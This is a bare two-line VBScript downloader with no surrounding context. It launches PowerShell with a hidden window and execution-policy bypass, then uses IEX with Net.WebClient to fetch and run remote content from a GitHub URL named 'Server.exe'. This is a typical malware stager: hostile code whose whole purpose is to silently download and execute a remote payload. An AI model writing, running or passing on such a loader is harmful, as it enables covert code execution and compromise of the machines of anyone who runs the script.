Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('https://github.com/Jadmintor/testonly/blob/main/Server.exe')", 0, False
